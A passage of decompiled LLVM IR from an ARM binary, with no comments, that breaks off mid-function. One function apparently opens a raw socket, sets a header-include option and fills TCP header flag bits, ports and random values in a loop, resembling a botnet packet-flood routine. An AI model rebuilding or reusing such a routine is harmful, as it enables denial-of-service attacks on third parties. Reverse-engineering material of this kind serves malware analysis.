  %v1_c1e4 = load i32, i32* @r4, align 4
  %v9_c1e4 = icmp eq i32 %v3_be04, %v1_c1e4
  store i1 %v9_c1e4, i1* %cpsr_z.global-to-local, align 1
  %v3_c1e8 = load i32, i32* @r5, align 4
  %v4_c1e8 = add i32 %v3_c1e8, 4
  %v5_c1e8 = inttoptr i32 %v4_c1e8 to i16*
  store i16 %v1_c1dc, i16* %v5_c1e8, align 2
  br i1 %v9_c1e4, label %dec_label_pc_c1f0, label %dec_label_pc_c1dc.dec_label_pc_c0b4_crit_edge

dec_label_pc_c1dc.dec_label_pc_c0b4_crit_edge:    ; preds = %dec_label_pc_c1dc
  %v1_c0b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0b4

dec_label_pc_c1f0:                                ; preds = %dec_label_pc_c1dc, %dec_label_pc_c0a8
  %v0_c1f0 = call i32 @function_f570()
  %v1_c1f0 = trunc i32 %v0_c1f0 to i16
  store i32 %v3_be08, i32* %r2.global-to-local, align 4
  %v1_c1f8 = load i32, i32* @r4, align 4
  %v9_c1f8 = icmp eq i32 %v3_be08, %v1_c1f8
  store i1 %v9_c1f8, i1* %cpsr_z.global-to-local, align 1
  %v3_c1fc = load i32, i32* @r5, align 4
  %v4_c1fc = add i32 %v3_c1fc, 20
  %v5_c1fc = inttoptr i32 %v4_c1fc to i16*
  store i16 %v1_c1f0, i16* %v5_c1fc, align 2
  br i1 %v9_c1f8, label %dec_label_pc_c204, label %dec_label_pc_c1f0.dec_label_pc_c0c0_crit_edge

dec_label_pc_c1f0.dec_label_pc_c0c0_crit_edge:    ; preds = %dec_label_pc_c1f0
  %v1_c0c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0c0

dec_label_pc_c204:                                ; preds = %dec_label_pc_c1f0, %dec_label_pc_c0b4
  %v0_c204 = call i32 @function_f570()
  %v1_c204 = trunc i32 %v0_c204 to i16
  store i32 %v5_bca0, i32* %r3.global-to-local, align 4
  %v1_c20c = load i32, i32* @r4, align 4
  %v9_c20c = icmp eq i32 %v5_bca0, %v1_c20c
  store i1 %v9_c20c, i1* %cpsr_z.global-to-local, align 1
  %v3_c210 = load i32, i32* @r6, align 4
  %v4_c210 = add i32 %v3_c210, 2
  %v5_c210 = inttoptr i32 %v4_c210 to i16*
  store i16 %v1_c204, i16* %v5_c210, align 2
  br i1 %v9_c20c, label %dec_label_pc_c218, label %dec_label_pc_c204.dec_label_pc_c0cc_crit_edge

dec_label_pc_c204.dec_label_pc_c0cc_crit_edge:    ; preds = %dec_label_pc_c204
  %v1_c0d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0cc

dec_label_pc_c218:                                ; preds = %dec_label_pc_c204, %dec_label_pc_c0c0
  %v0_c218 = call i32 @function_f570()
  store i32 %v6_bcbc, i32* %r1.global-to-local, align 4
  %v1_c220 = load i32, i32* @r4, align 4
  %v9_c220 = icmp eq i32 %v6_bcbc, %v1_c220
  store i1 %v9_c220, i1* %cpsr_z.global-to-local, align 1
  %v1_c224 = load i32, i32* @r6, align 4
  %v2_c224 = add i32 %v1_c224, 4
  %v3_c224 = inttoptr i32 %v2_c224 to i32*
  store i32 %v0_c218, i32* %v3_c224, align 4
  br i1 %v9_c220, label %dec_label_pc_c22c, label %dec_label_pc_c0d8

dec_label_pc_c22c:                                ; preds = %dec_label_pc_c218, %dec_label_pc_c0cc
  %v0_c22c = call i32 @function_f570()
  store i32 %v1_bd8c, i32* %r2.global-to-local, align 4
  store i1 %v2_c234, i1* %cpsr_z.global-to-local, align 1
  %v1_c238 = load i32, i32* @r6, align 4
  %v2_c238 = add i32 %v1_c238, 8
  %v3_c238 = inttoptr i32 %v2_c238 to i32*
  store i32 %v0_c22c, i32* %v3_c238, align 4
  br i1 %v2_c234, label %dec_label_pc_c0e4, label %dec_label_pc_c240

dec_label_pc_c240:                                ; preds = %dec_label_pc_c0d8, %dec_label_pc_c22c
  %v0_c240 = load i32, i32* @r5, align 4
  %v1_c240 = add i32 %v0_c240, 40
  store i32 %v5_bd64, i32* %r1.global-to-local, align 4
  %v2_c248 = inttoptr i32 %v1_c240 to i16*
  %v3_c248 = call i32 @function_f770(i16* %v2_c248, i32 %v5_bd64)
  br label %dec_label_pc_c0e4

dec_label_pc_c250:                                ; preds = %dec_label_pc_bdec
  store i32 %v5_bd64, i32* %r1.global-to-local, align 4
  %v1_c258 = add i32 %v5_bd64, 20
  store i32 %v1_c258, i32* %sb.global-to-local, align 4
  %v3_c25c = mul i32 %v5_bd64, 65536
  store i32 %v3_c25c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c044

; uselistorder directives
  uselistorder i32 %v1_c160, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c12c, { 1, 0 }
  uselistorder i1 %v2_c234, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c1d0, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-148.0, { 1, 0 }
  uselistorder i32 %v0_c00c, { 1, 0 }
  uselistorder i32 %v1_bf90, { 1, 0, 2, 3 }
  uselistorder i32 %v1_be78, { 2, 0, 1 }
  uselistorder i32 %v1_be74, { 2, 0, 1 }
  uselistorder i32 %v1_be70, { 1, 0 }
  uselistorder i32 %v1_be58, { 1, 0 }
  uselistorder i32 %v1_be54, { 1, 0 }
  uselistorder i32 %v1_be50, { 1, 0 }
  uselistorder i32 %v3_be2c, { 1, 0 }
  uselistorder i32 %v3_be00, { 0, 1, 4, 2, 3 }
  uselistorder i1 %v7_bde4, { 1, 0 }
  uselistorder i1 %v7_bdb8, { 1, 0 }
  uselistorder i32 %v3_bdb4, { 5, 1, 3, 4, 2, 0, 6 }
  uselistorder i32 %v6_bda0, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_bd8c, { 1, 0, 2, 3 }
  uselistorder i32 %v5_bd64, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bd04, { 0, 2, 1 }
  uselistorder i32 %v6_bcbc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bca0, { 4, 3, 2, 1, 0 }
  uselistorder i8 %v5_bc0c, { 1, 0 }
  uselistorder i32 %v2_bbd4, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 27, 28, 29, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 20, 21, 22, 13, 14, 15, 16, 17, 18, 19, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 16, 17, 18, 11, 12, 13, 14, 15, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 38, 37, 40, 39, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 21, 18, 19, 22, 23, 24 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c240, { 1, 0 }
  uselistorder label %dec_label_pc_c0e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c060, { 1, 0 }
  uselistorder label %dec_label_pc_c050, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c02c, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_be94, { 1, 0 }
}

define i32 @function_c270(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c270:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c270 = load i32, i32* @r4, align 4
  %v27_c270 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c28c = call i32 @function_13258(i32 %arg1, i32 4)
  %v0_c290 = load i32, i32* @r5, align 4
  store i32 %v0_c290, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2a0 = load i32, i32* @r4, align 4
  %v5_c2a4 = inttoptr i32 %v0_c290 to i32*
  %v6_c2a4 = call i32 @function_a430(i32 %v0_c2a0, i32* %v5_c2a4, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c2bc = load i32, i32* @r5, align 4
  store i32 %v0_c2bc, i32* %r1.global-to-local, align 4
  %v0_c2c0 = load i32, i32* @r4, align 4
  %v5_c2c4 = trunc i32 %v6_c2a4 to i8
  %v6_c2c8 = inttoptr i32 %v0_c2bc to i32*
  %v7_c2c8 = call i32 @function_a430(i32 %v0_c2c0, i32* %v6_c2c8, i32 3, i32 65535)
  %v0_c2cc = load i32, i32* @r5, align 4
  store i32 %v0_c2cc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r4, align 4
  %v5_c2e0 = inttoptr i32 %v0_c2cc to i32*
  %v6_c2e0 = call i32 @function_a430(i32 %v0_c2dc, i32* %v5_c2e0, i32 4, i32 64)
  %v0_c2ec = load i32, i32* @r5, align 4
  store i32 %v0_c2ec, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c2f8 = load i32, i32* @r4, align 4
  %v6_c300 = inttoptr i32 %v0_c2ec to i32*
  %v7_c300 = call i32 @function_a430(i32 %v0_c2f8, i32* %v6_c300, i32 5, i32 1)
  %v1_c30c = urem i32 %v7_c300, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c318 = load i32, i32* @r5, align 4
  store i32 %v0_c318, i32* %r1.global-to-local, align 4
  %v0_c31c = load i32, i32* @r4, align 4
  %v5_c324 = inttoptr i32 %v0_c318 to i32*
  %v6_c324 = call i32 @function_a430(i32 %v0_c31c, i32* %v5_c324, i32 6, i32 65535)
  %v0_c330 = load i32, i32* @r5, align 4
  store i32 %v0_c330, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  %v5_c340 = inttoptr i32 %v0_c330 to i32*
  %v6_c340 = call i32 @function_a430(i32 %v0_c33c, i32* %v5_c340, i32 7, i32 65535)
  %v0_c34c = load i32, i32* @r5, align 4
  store i32 %v0_c34c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_c358 = load i32, i32* @r4, align 4
  %v5_c35c = inttoptr i32 %v0_c34c to i32*
  %v6_c35c = call i32 @function_a430(i32 %v0_c358, i32* %v5_c35c, i32 17, i32 65535)
  %v0_c360 = load i32, i32* @r5, align 4
  store i32 %v0_c360, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c370 = load i32, i32* @r4, align 4
  %v5_c374 = inttoptr i32 %v0_c360 to i32*
  %v6_c374 = call i32 @function_a430(i32 %v0_c370, i32* %v5_c374, i32 18, i32 0)
  %v0_c378 = load i32, i32* @r5, align 4
  store i32 %v0_c378, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c388 = load i32, i32* @r4, align 4
  %v5_c38c = inttoptr i32 %v0_c378 to i32*
  %v6_c38c = call i32 @function_a430(i32 %v0_c388, i32* %v5_c38c, i32 11, i32 0)
  %v0_c390 = load i32, i32* @r5, align 4
  store i32 %v0_c390, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c3a0 = load i32, i32* @r4, align 4
  %v5_c3a4 = inttoptr i32 %v0_c390 to i32*
  %v6_c3a4 = call i32 @function_a430(i32 %v0_c3a0, i32* %v5_c3a4, i32 12, i32 0)
  %v0_c3a8 = load i32, i32* @r5, align 4
  store i32 %v0_c3a8, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c3b8 = load i32, i32* @r4, align 4
  %v5_c3bc = inttoptr i32 %v0_c3a8 to i32*
  %v6_c3bc = call i32 @function_a430(i32 %v0_c3b8, i32* %v5_c3bc, i32 13, i32 0)
  %v0_c3c0 = load i32, i32* @r5, align 4
  store i32 %v0_c3c0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c3d0 = load i32, i32* @r4, align 4
  %v5_c3d4 = inttoptr i32 %v0_c3c0 to i32*
  %v6_c3d4 = call i32 @function_a430(i32 %v0_c3d0, i32* %v5_c3d4, i32 14, i32 0)
  %v0_c3d8 = load i32, i32* @r5, align 4
  store i32 %v0_c3d8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v6_c3d4, i32* @sb, align 4
  %v0_c3e8 = load i32, i32* @r4, align 4
  %v4_c3ec = inttoptr i32 %v0_c3d8 to i32*
  %v5_c3ec = call i32 @function_a430(i32 %v0_c3e8, i32* %v4_c3ec, i32 15, i32 1)
  %v0_c3f0 = load i32, i32* @r5, align 4
  store i32 %v0_c3f0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v5_c3ec, i32* @sl, align 4
  %v0_c400 = load i32, i32* @r4, align 4
  %v4_c404 = inttoptr i32 %v0_c3f0 to i32*
  %v5_c404 = call i32 @function_a430(i32 %v0_c400, i32* %v4_c404, i32 16, i32 0)
  %v0_c40c = load i32, i32* @r5, align 4
  store i32 %v0_c40c, i32* %r1.global-to-local, align 4
  %v2_c410 = load i32, i32* @global_var_2295c.90, align 4
  store i32 %v2_c410, i32* %r3.global-to-local, align 4
  store i32 %v5_c404, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c41c = load i32, i32* @r4, align 4
  %v5_c420 = inttoptr i32 %v0_c40c to i32*
  %v6_c420 = call i32 @function_a3c4(i32 %v0_c41c, i32* %v5_c420, i32 25, i32 %v2_c410, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c434 = call i32 @function_14ba0(i32 2, i32 3, i32 6)
  store i32 %v3_c434, i32* @r0, align 4
  %v7_c438 = icmp eq i32 %v3_c434, -1
  store i1 %v7_c438, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c434, i32* @fp, align 4
  br i1 %v7_c438, label %dec_label_pc_c8dc, label %dec_label_pc_c444

dec_label_pc_c444:                                ; preds = %dec_label_pc_c270
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c44c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c44c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_c460 = call i32 @function_14b30(i32 %v3_c434, i32 0, i32 3, i32 %v6_c44c, i32 ptrtoint (i32* @0 to i32))
  %v7_c464 = icmp eq i32 %v5_c460, -1
  store i1 %v7_c464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c464, label %dec_label_pc_c8d4, label %dec_label_pc_c46c

dec_label_pc_c46c:                                ; preds = %dec_label_pc_c444
  %v3_c484 = urem i32 %v6_c340, 65536
  %v3_c494 = urem i32 %v7_c2c8, 65536
  store i32 %v3_c494, i32* %r3.global-to-local, align 4
  %v3_c498 = urem i32 %v6_c324, 65536
  store i32 %v3_c498, i32* %r2.global-to-local, align 4
  %v1_c49c = urem i32 %v6_c38c, 256
  store i32 %v1_c49c, i32* %r1.global-to-local, align 4
  %v0_c4a0 = load i32, i32* @r7, align 4
  %v2_c4a0 = icmp eq i32 %v0_c4a0, 0
  store i1 %v2_c4a0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c4a0, label %dec_label_pc_c7f0.preheader, label %dec_label_pc_c4b8

dec_label_pc_c4b8:                                ; preds = %dec_label_pc_c46c
  store i32 %v6_c35c, i32* %r2.global-to-local, align 4
  %v3_c4c0 = urem i32 %v6_c35c, 65536
  store i32 0, i32* @r4, align 4
  %v1_c4d8 = urem i32 %v6_c38c, 2
  store i32 %v1_c4d8, i32* %r3.global-to-local, align 4
  %v1_c4dc = urem i32 %v6_c3a4, 2
  %v1_c4e0 = urem i32 %v6_c3bc, 2
  store i32 %v1_c4e0, i32* %r1.global-to-local, align 4
  %v0_c4e4 = load i32, i32* @sb, align 4
  %v1_c4e4 = urem i32 %v0_c4e4, 2
  store i32 %v1_c4e4, i32* @sb, align 4
  %v0_c4e8 = load i32, i32* @sl, align 4
  %v1_c4e8 = urem i32 %v0_c4e8, 2
  store i32 %v1_c4e8, i32* @sl, align 4
  %v0_c4ec = load i32, i32* @r6, align 4
  %v1_c4ec = urem i32 %v0_c4ec, 2
  store i32 %v1_c4ec, i32* @r6, align 4
  %v4_c698 = sext i8 %v5_c2c4 to i32
  %sext = mul i32 %v6_c2e0, 16777216
  %v4_c6b8 = sdiv i32 %sext, 16777216
  %v2_c6bc = icmp eq i32 %v1_c30c, 0
  %tmp = sub nsw i32 0, %v1_c4d8
  %v4_c560 = and i32 %tmp, 32
  %tmp51 = sub nsw i32 0, %v1_c4dc
  %v4_c574 = and i32 %tmp51, 16
  %tmp52 = sub nsw i32 0, %v1_c4e0
  %v4_c588 = and i32 %tmp52, 8
  %tmp53 = sub nsw i32 0, %v1_c4e4
  %v4_c59c = and i32 %tmp53, 4
  %tmp54 = sub nsw i32 0, %v1_c4e8
  %v3_c5b0 = and i32 %tmp54, 2
  br label %dec_label_pc_c65c

dec_label_pc_c50c:                                ; preds = %dec_label_pc_c65c, %dec_label_pc_c6d0
  %v2_c510 = phi i32 [ %v0_c6c8, %dec_label_pc_c65c ], [ %v2_c510.pre, %dec_label_pc_c6d0 ]
  store i32 6, i32* @r6, align 4
  %v3_c510 = add i32 %v2_c510, 9
  %v4_c510 = inttoptr i32 %v3_c510 to i8*
  store i8 6, i8* %v4_c510, align 1
  %v3_c514 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c514, i32* %r2.global-to-local, align 4
  %v3_c51c = mul i32 %v3_c514, 32
  store i32 %v3_c51c, i32* %r3.global-to-local, align 4
  %v1_c520 = load i32, i32* @sb, align 4
  %v2_c520 = add i32 %v1_c520, 12
  %v3_c520 = inttoptr i32 %v2_c520 to i32*
  store i32 %v6_c420, i32* %v3_c520, align 4
  %v0_c524 = load i32, i32* %r3.global-to-local, align 4
  %v1_c524 = load i32, i32* %r2.global-to-local, align 4
  %tmp55 = mul i32 %v1_c524, -8
  %v5_c524 = add i32 %v0_c524, %tmp55
  %v1_c528 = load i32, i32* @r8, align 4
  %v2_c528 = add i32 %v1_c528, %v5_c524
  store i32 %v2_c528, i32* %r3.global-to-local, align 4
  %v1_c52c = add i32 %v2_c528, 16
  %v2_c52c = inttoptr i32 %v1_c52c to i32*
  %v3_c52c = load i32, i32* %v2_c52c, align 4
  store i32 %v3_c52c, i32* %r2.global-to-local, align 4
  %v1_c534 = load i32, i32* @sb, align 4
  %v2_c534 = add i32 %v1_c534, 16
  %v3_c534 = inttoptr i32 %v2_c534 to i32*
  store i32 %v3_c52c, i32* %v3_c534, align 4
  %v1_c538 = call i32 @function_14898(i32 %v3_c498)
  %v2_c538 = trunc i32 %v1_c538 to i16
  %v3_c53c = load i32, i32* @sb, align 4
  %v4_c53c = add i32 %v3_c53c, 20
  %v5_c53c = inttoptr i32 %v4_c53c to i16*
  store i16 %v2_c538, i16* %v5_c53c, align 2
  %v1_c544 = call i32 @function_14898(i32 %v3_c484)
  %v2_c544 = trunc i32 %v1_c544 to i16
  %v3_c548 = load i32, i32* @sl, align 4
  %v4_c548 = add i32 %v3_c548, 2
  %v5_c548 = inttoptr i32 %v4_c548 to i16*
  store i16 %v2_c544, i16* %v5_c548, align 2
  %v1_c550 = call i32 @function_14898(i32 %v3_c4c0)
  %v0_c554 = load i32, i32* @sl, align 4
  %v1_c554 = add i32 %v0_c554, 13
  %v2_c554 = inttoptr i32 %v1_c554 to i8*
  %v3_c554 = load i8, i8* %v2_c554, align 1
  %v4_c554 = zext i8 %v3_c554 to i32
  store i32 %v1_c4d8, i32* %r1.global-to-local, align 4
  %v1_c55c = and i32 %v4_c554, 223
  %v5_c560 = or i32 %v1_c55c, %v4_c560
  store i32 %v5_c560, i32* %r3.global-to-local, align 4
  %v1_c564 = trunc i32 %v5_c560 to i8
  store i8 %v1_c564, i8* %v2_c554, align 1
  %v0_c568 = load i32, i32* @sl, align 4
  %v1_c568 = add i32 %v0_c568, 13
  %v2_c568 = inttoptr i32 %v1_c568 to i8*
  %v3_c568 = load i8, i8* %v2_c568, align 1
  %v4_c568 = zext i8 %v3_c568 to i32
  store i32 %v1_c4dc, i32* %r3.global-to-local, align 4
  %v1_c570 = and i32 %v4_c568, 239
  %v5_c574 = or i32 %v1_c570, %v4_c574
  store i32 %v5_c574, i32* %r2.global-to-local, align 4
  %v1_c578 = trunc i32 %v5_c574 to i8
  store i8 %v1_c578, i8* %v2_c568, align 1
  %v0_c57c = load i32, i32* @sl, align 4
  %v1_c57c = add i32 %v0_c57c, 13
  %v2_c57c = inttoptr i32 %v1_c57c to i8*
  %v3_c57c = load i8, i8* %v2_c57c, align 1
  %v4_c57c = zext i8 %v3_c57c to i32
  store i32 %v1_c4e0, i32* %r1.global-to-local, align 4
  %v1_c584 = and i32 %v4_c57c, 247
  %v5_c588 = or i32 %v1_c584, %v4_c588
  store i32 %v5_c588, i32* %r3.global-to-local, align 4
  %v1_c58c = trunc i32 %v5_c588 to i8
  store i8 %v1_c58c, i8* %v2_c57c, align 1
  %v0_c590 = load i32, i32* @sl, align 4
  %v1_c590 = add i32 %v0_c590, 13
  %v2_c590 = inttoptr i32 %v1_c590 to i8*
  %v3_c590 = load i8, i8* %v2_c590, align 1
  %v4_c590 = zext i8 %v3_c590 to i32
  store i32 %v1_c4e4, i32* %r3.global-to-local, align 4
  %v1_c598 = and i32 %v4_c590, 251
  %v5_c59c = or i32 %v1_c598, %v4_c59c
  store i32 %v5_c59c, i32* %r2.global-to-local, align 4
  %v1_c5a0 = trunc i32 %v5_c59c to i8
  store i8 %v1_c5a0, i8* %v2_c590, align 1
  %v0_c5a4 = load i32, i32* @sl, align 4
  %v1_c5a4 = add i32 %v0_c5a4, 13
  %v2_c5a4 = inttoptr i32 %v1_c5a4 to i8*
  %v3_c5a4 = load i8, i8* %v2_c5a4, align 1
  %v4_c5a4 = zext i8 %v3_c5a4 to i32
  store i32 %v1_c4e8, i32* %r1.global-to-local, align 4
  %v1_c5ac = and i32 %v4_c5a4, 253
  %v4_c5b0 = or i32 %v1_c5ac, %v3_c5b0
  store i32 %v4_c5b0, i32* %r3.global-to-local, align 4
  %v1_c5b4 = trunc i32 %v4_c5b0 to i8
  store i8 %v1_c5b4, i8* %v2_c5a4, align 1
  %v0_c5b8 = load i32, i32* @sl, align 4
  %v1_c5b8 = add i32 %v0_c5b8, 12
  %v2_c5b8 = inttoptr i32 %v1_c5b8 to i8*
  %v3_c5b8 = load i8, i8* %v2_c5b8, align 1
  %v4_c5b8 = zext i8 %v3_c5b8 to i32
  store i32 %v4_c5b8, i32* %r2.global-to-local, align 4
  %v1_c5bc = add i32 %v0_c5b8, 13
  %v2_c5bc = inttoptr i32 %v1_c5bc to i8*
  %v3_c5bc = load i8, i8* %v2_c5bc, align 1
  %v4_c5bc = zext i8 %v3_c5bc to i32
  store i32 %v1_c4ec, i32* %r1.global-to-local, align 4
  %tmp56 = urem i8 %v3_c5b8, 16
  %v1_c5c4 = zext i8 %tmp56 to i32
  %v1_c5c8 = and i32 %v4_c5bc, 254
  %v2_c5cc = or i32 %v1_c5c8, %v1_c4ec
  store i32 %v2_c5cc, i32* %r3.global-to-local, align 4
  %v1_c5d0 = or i32 %v1_c5c4, 160
  store i32 %v1_c5d0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r4.global-to-local, align 4
  store i32 4, i32* @r5, align 4
  %v1_c5dc = trunc i32 %v2_c5cc to i8
  store i8 %v1_c5dc, i8* %v2_c5bc, align 1
  %v0_c5e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c5e0 = trunc i32 %v0_c5e0 to i8
  %v2_c5e0 = load i32, i32* @sl, align 4
  %v3_c5e0 = add i32 %v2_c5e0, 12
  %v4_c5e0 = inttoptr i32 %v3_c5e0 to i8*
  store i8 %v1_c5e0, i8* %v4_c5e0, align 1
  %v1_c5e4 = load i32, i32* @sl, align 4
  %v2_c5e4 = add i32 %v1_c5e4, 4
  %v3_c5e4 = inttoptr i32 %v2_c5e4 to i32*
  store i32 %v1_c550, i32* %v3_c5e4, align 4
  %v0_c5e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c5e8 = trunc i32 %v0_c5e8 to i8
  %v2_c5e8 = load i32, i32* @sb, align 4
  %v3_c5e8 = add i32 %v2_c5e8, 40
  %v4_c5e8 = inttoptr i32 %v3_c5e8 to i8*
  store i8 %v1_c5e8, i8* %v4_c5e8, align 1
  %v0_c5ec = load i32, i32* @r5, align 4
  %v1_c5ec = trunc i32 %v0_c5ec to i8
  %v2_c5ec = load i32, i32* @sb, align 4
  %v3_c5ec = add i32 %v2_c5ec, 41
  %v4_c5ec = inttoptr i32 %v3_c5ec to i8*
  store i8 %v1_c5ec, i8* %v4_c5ec, align 1
  %v0_c5f0 = call i32 @function_f570()
  %v1_c5f4 = urem i32 %v0_c5f0, 16
  %v1_c5f8 = or i32 %v1_c5f4, 1392
  %v1_c5fc = add nuw nsw i32 %v1_c5f8, 8
  %v1_c600 = call i32 @function_14898(i32 %v1_c5fc)
  %v2_c600 = trunc i32 %v1_c600 to i16
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_c60c = load i32, i32* %r4.global-to-local, align 4
  %v1_c60c = trunc i32 %v0_c60c to i8
  %v2_c60c = load i32, i32* @sb, align 4
  %v3_c60c = add i32 %v2_c60c, 45
  %v4_c60c = inttoptr i32 %v3_c60c to i8*
  store i8 %v1_c60c, i8* %v4_c60c, align 1
  %v0_c610 = load i32, i32* %r3.global-to-local, align 4
  %v1_c610 = trunc i32 %v0_c610 to i8
  %v2_c610 = load i32, i32* @sb, align 4
  %v3_c610 = add i32 %v2_c610, 46
  %v4_c610 = inttoptr i32 %v3_c610 to i8*
  store i8 %v1_c610, i8* %v4_c610, align 1
  %v0_c614 = load i32, i32* %r2.global-to-local, align 4
  %v1_c614 = trunc i32 %v0_c614 to i8
  %v2_c614 = load i32, i32* @sb, align 4
  %v3_c614 = add i32 %v2_c614, 47
  %v4_c614 = inttoptr i32 %v3_c614 to i8*
  store i8 %v1_c614, i8* %v4_c614, align 1
  %v3_c618 = load i32, i32* @sb, align 4
  %v4_c618 = add i32 %v3_c618, 42
  %v5_c618 = inttoptr i32 %v4_c618 to i16*
  store i16 %v2_c600, i16* %v5_c618, align 2
  %v0_c61c = load i32, i32* @r5, align 4
  %v1_c61c = trunc i32 %v0_c61c to i8
  %v2_c61c = load i32, i32* @sb, align 4
  %v3_c61c = add i32 %v2_c61c, 44
  %v4_c61c = inttoptr i32 %v3_c61c to i8*
  store i8 %v1_c61c, i8* %v4_c61c, align 1
  %v0_c620 = call i32 @function_f570()
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_c630 = load i32, i32* @r6, align 4
  %v1_c630 = trunc i32 %v0_c630 to i8
  %v2_c630 = load i32, i32* @sb, align 4
  %v3_c630 = add i32 %v2_c630, 59
  %v4_c630 = inttoptr i32 %v3_c630 to i8*
  store i8 %v1_c630, i8* %v4_c630, align 1
  %v1_c634 = load i32, i32* @sb, align 4
  %v2_c634 = add i32 %v1_c634, 48
  %v3_c634 = inttoptr i32 %v2_c634 to i32*
  store i32 %v0_c620, i32* %v3_c634, align 4
  %v0_c638 = load i32, i32* %r3.global-to-local, align 4
  %v1_c638 = load i32, i32* @sb, align 4
  %v2_c638 = add i32 %v1_c638, 52
  %v3_c638 = inttoptr i32 %v2_c638 to i32*
